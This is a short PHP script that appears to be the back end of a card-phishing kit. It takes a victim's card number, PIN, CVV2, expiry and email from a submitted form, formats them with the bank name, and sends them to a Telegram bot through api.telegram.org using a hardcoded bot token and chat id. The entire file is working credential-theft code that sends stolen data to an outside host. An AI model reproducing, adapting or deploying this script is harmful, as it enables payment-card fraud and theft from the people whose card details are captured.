<?php
include "functions.php";
$ID = 1033377956; // Chat id (Channel, sGroup, pv , ...)
$TOKEN = "1046724784:AAG4dsrIFea1vnY8kT4rYM84gm0weOLSdW4"; //Bot Token 
$paylimit = 4;  // Users Enter Cards Peer load page - spam
$sendEmail = false; // true for send email
$pan = $_POST["pan"];
$pin = $_POST["pin"];
$cvv = $_POST["cvv2"];
$year = $_POST["year"];
$month = $_POST["month"];
$num = $_POST["num"];
if(isset($_POST["email"])){
    $email = $_POST["email"];
}else{
    $email = "None";
}
$pan1 = substr($pan,0,4);
$pan2 = substr($pan,4,-8);
$pan3 = substr($pan,8,-4);
$pan4 = substr($pan,12);
$cardn = substr($pan,0,-10);
$bankinfo = bank_information($cardn);
$Text = "
Bank: $bankinfo[1]
Card: <code>$pan1 $pan2 $pan3 $pan4</code>
Pass: <code>$pin</code>
Cvv2: <code>$cvv</code>
Date: <code>$year - $month</code>
#INFO";
if($sendEmail==true){
    $Text .="\n⁉️Email: $email";
}

if( (integer)$num > $paylimit){}else{
    file_get_contents("https://api.telegram.org/bot$TOKEN/sendMessage?parse_mode=HTML&chat_id=$ID&text=".urlencode($Text)); 
}
?>